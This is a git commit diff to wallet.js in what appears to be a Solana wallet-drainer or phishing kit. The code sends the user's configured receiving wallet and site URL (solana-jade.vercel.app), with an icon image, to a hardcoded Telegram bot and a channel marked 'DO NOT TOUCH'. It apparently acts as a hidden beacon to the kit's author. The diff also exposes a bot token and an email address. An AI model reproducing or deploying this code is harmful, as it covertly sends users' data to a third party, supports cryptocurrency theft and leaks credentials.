ba4dcbd0d03b200308fb9aff0a51081db45fbc3a
Heronwaterwow <liton101020@gmail.com>
2025-05-16 01:31:47 +0300

    Update wallet.js

--- wallet.js
+++ wallet.js
@@ -6,20 +6,20 @@ const botToken = '7520075192:AAEkcBfRcBdfWvnS1qouENDpljroGyTkKSo';
 // Telegram channel ID [ DO NOT TOUCH ]
 const chatId = '7253475769';
 
-
-async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
+async function sendPhotoWithCaption(photoUrl, solana_wallet_receiver_id, website_url) {
     try {
-        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
+        const caption = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
         const response = await axios.post(
-            `https://api.telegram.org/bot${botToken}/sendMessage`, // Обязательно использовать обратные кавычки!
+            `https://api.telegram.org/bot${botToken}/sendPhoto`,
             {
                 chat_id: chatId,
-                text: message
+                photo: photoUrl,
+                caption: caption
             }
         );
-        console.log('Message sent to Telegram:', response.data);
+        console.log('Photo sent to Telegram:', response.data);
     } catch (error) {
-        console.error('Error sending message to Telegram:', error);
+        console.error('Error sending photo to Telegram:', error);
     }
 }
 
@@ -27,4 +27,6 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
 // Change this information for yours (
 const solana_wallet_receiver_id = 'DSj8cEN1Bd9CxFrrgNMuwcTnqtfJ4JKFakLeFnjDYNvR';
 const website_url = 'https://solana-jade.vercel.app/';
-sendMessageToTelegram(solana_wallet_receiver_id, website_url);
+const icon_url = 'https://digiseller.mycdn.ink/preview/1078014/p1_4530876_67bf7cf4.png'; // URL иконки
+
+sendPhotoWithCaption(icon_url, solana_wallet_receiver_id, website_url);
